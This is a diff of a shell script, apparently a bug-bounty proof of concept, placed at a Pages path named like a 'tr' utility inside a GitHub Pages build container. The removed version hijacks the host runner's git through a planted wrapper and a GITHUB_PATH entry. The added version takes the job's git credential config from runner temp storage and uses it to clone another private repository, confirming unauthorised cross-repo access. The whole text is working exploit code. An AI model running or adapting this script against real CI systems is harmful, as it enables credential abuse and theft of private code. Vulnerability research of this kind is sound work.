@@ -3,32 +3,66 @@ permalink: /bbp-bin/tr
 ---
 #!/bin/sh
 
-if [ ! -e /tmp/pages-bbp-container-once-r4-7f3c ]; then
-  : > /tmp/pages-bbp-container-once-r4-7f3c
-  printf '%s\n' '::notice::PAGES_CONTAINER_EXEC_CANARY_20260918_R4_7F3C' >&2
+if [ ! -e /tmp/pages-bbp-container-once-r5-9c24 ]; then
+  : > /tmp/pages-bbp-container-once-r5-9c24
+  printf '%s\n' '::notice::PAGES_CONTAINER_EXEC_CANARY_20260918_R5_9C24' >&2
 
   if [ ! -e /github/workspace/_site/bbp-control ] && [ ! -L /github/workspace/_site/bbp-control ]; then
-    printf '%s\n' '::notice::PAGES_UNUSED_SYMLINK_CONTROL_REMOVED_20260918_R4_7F3C' >&2
+    printf '%s\n' '::notice::PAGES_UNUSED_SYMLINK_CONTROL_REMOVED_20260918_R5_9C24' >&2
   fi
 
-  if [ "${GITHUB_RUN_NUMBER:-}" = '4' ] && [ "${GITHUB_RUN_ATTEMPT:-}" = '1' ]; then
-    container_bin='/github/runner_temp/pages-bbp-host-bin-r4-7f3c'
-    host_bin='/home/runner/work/_temp/pages-bbp-host-bin-r4-7f3c'
-    /bin/mkdir -p "$container_bin"
-    /bin/cat > "$container_bin/git" <<'PAGES_BBP_HOST_WRAPPER'
-#!/bin/sh
-marker="${RUNNER_TEMP}/pages-bbp-host-marker-r4-7f3c"
-if [ ! -e "$marker" ]; then
-  : > "$marker"
-  printf '%s\n' '::notice::PAGES_HOST_EXEC_CANARY_20260918_R4_7F3C' >&2
-fi
-exec /usr/bin/git "$@"
-PAGES_BBP_HOST_WRAPPER
-    /bin/chmod 0755 "$container_bin/git"
-    printf '%s\n' "$host_bin" >> "$GITHUB_PATH"
-    printf '%s\n' '::notice::PAGES_HOST_PATH_BRIDGE_ARMED_20260918_R4_7F3C' >&2
+  if [ "${GITHUB_RUN_NUMBER:-}" = '5' ] && [ "${GITHUB_RUN_ATTEMPT:-}" = '1' ]; then
+    if GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_TERMINAL_PROMPT=0 \
+      /usr/bin/git ls-remote --exit-code \
+      https://github.com/aidan02h12/pages-sass-symlink-bbp-20260917.git \
+      HEAD >/dev/null 2>&1; then
+      printf '%s\n' '::notice::PAGES_PUBLIC_CONTROL_OK_20260918_R5_9C24' >&2
+    else
+      printf '%s\n' '::notice::PAGES_PUBLIC_CONTROL_FAILED_20260918_R5_9C24' >&2
+    fi
+
+    if GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_TERMINAL_PROMPT=0 \
+      /usr/bin/git ls-remote --exit-code \
+      https://github.com/aidan02h12/pages-artifact-donor-bbp-20260917.git \
+      HEAD >/dev/null 2>&1; then
+      printf '%s\n' '::warning::PAGES_ANON_PRIVATE_UNEXPECTEDLY_ACCEPTED_20260918_R5_9C24' >&2
+    else
+      printf '%s\n' '::notice::PAGES_ANON_PRIVATE_REJECTED_20260918_R5_9C24' >&2
+    fi
+
+    credential_config=''
+    for candidate in /github/runner_temp/git-credentials-*.config; do
+      if [ -f "$candidate" ]; then
+        credential_config="$candidate"
+        break
+      fi
+    done
+
+    if [ -z "$credential_config" ]; then
+      printf '%s\n' '::notice::PAGES_JOB_CREDENTIAL_CONFIG_MISSING_20260918_R5_9C24' >&2
+    else
+      printf '%s\n' '::notice::PAGES_JOB_CREDENTIAL_CONFIG_PRESENT_20260918_R5_9C24' >&2
+      donor_dir='/tmp/pages-bbp-private-donor-r5-9c24'
+      if GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_SYSTEM=/dev/null GIT_TERMINAL_PROMPT=0 \
+        /usr/bin/git -c include.path="$credential_config" clone --quiet --depth=1 \
+        --no-checkout \
+        https://github.com/aidan02h12/pages-artifact-donor-bbp-20260917.git \
+        "$donor_dir" >/dev/null 2>&1; then
+        observed_blob=$(/usr/bin/git --git-dir="$donor_dir/.git" \
+          rev-parse HEAD:SECURITY-RESEARCH-FIXTURE.md 2>/dev/null)
+        if [ "$observed_blob" = 'df34486a63da185478e25b2972163612eb2856b6' ]; then
+          printf '%s\n' '::warning::PAGES_CROSS_REPO_MARKER_READ_ACCEPTED_20260918_R5_9C24' >&2
+        else
+          printf '%s\n' '::warning::PAGES_CROSS_REPO_CLONE_ACCEPTED_MARKER_MISMATCH_20260918_R5_9C24' >&2
+        fi
+        observed_blob=''
+      else
+        printf '%s\n' '::notice::PAGES_CROSS_REPO_MARKER_READ_REJECTED_20260918_R5_9C24' >&2
+      fi
+      credential_config=''
+    fi
   else
-    printf '%s\n' '::notice::PAGES_ONE_SHOT_GUARD_MISS_20260918_R4_7F3C' >&2
+    printf '%s\n' '::notice::PAGES_ONE_SHOT_GUARD_MISS_20260918_R5_9C24' >&2
   fi
 fi
 
